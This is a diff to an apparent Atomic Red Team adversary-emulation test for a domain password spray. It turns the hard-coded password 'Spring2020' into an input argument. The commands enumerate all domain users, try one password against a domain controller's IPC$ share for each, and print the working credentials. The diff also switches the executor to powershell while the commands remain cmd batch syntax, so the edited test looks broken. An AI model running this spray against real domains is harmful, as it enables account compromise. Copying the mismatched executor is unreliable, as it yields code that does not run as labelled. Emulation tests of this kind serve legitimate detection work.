@@ -5,6 +5,11 @@ atomic_tests:
   description: This atomic will create a list of all domain users in the temp directory called users.txt. It will then attempt to map the IPC$ share on one of the Domain Controllers using a password of Spring2020 for each user in the list. It will print successful authentications to the screen.
   supported_platforms:
   - windows
+  input_arguments:
+    password:
+      description: The password to try for each user in users.txt
+      type: string
+      default: Spring2020
   executor:
     command: |-
       rem Create the users.txt by parsing the "net users /domain" output
@@ -13,12 +18,6 @@ atomic_tests:
       @FOR /F "delims=" %a in (%temp%\1.txt) do @set line=%a & @call echo %^line:, =,% >> %temp%\2.txt
       @FOR /F "tokens=1-3 delims=," %n in (%temp%\2.txt) do @echo %n >> %temp%\3.txt & @echo %o >> %temp%\3.txt & @echo %p >> %temp%\3.txt
       @FOR /F "tokens=*" %a in ('type %temp%\3.txt ^| findstr /vc:"ECHO is on."') do @echo %a >> %temp%\users.txt
-      rem Reset the command window title so you can see the progress of the password spray in the title
-      title Command Prompt
-      rem Set your password for the spray here
-      set password=Spring2020
       rem Execute the password spray, trying the password set above for every user in the domain
-      @FOR /F %n in (%temp%\users.txt) do @net use %logonserver%\IPC$ /user:"%userdomain%\%n" "%password%" 1>NUL 2>&1 && @echo [*] %n:%password% && @net use /delete %logonserver%\IPC$ > NUL
-    name: command_prompt
-  
-  
+      @FOR /F %n in (%temp%\users.txt) do @net use %logonserver%\IPC$ /user:"%userdomain%\%n" "#{password}" 1>NUL 2>&1 && @echo [*] %n:#{password} && @net use /delete %logonserver%\IPC$ > NUL
+    name: powershell
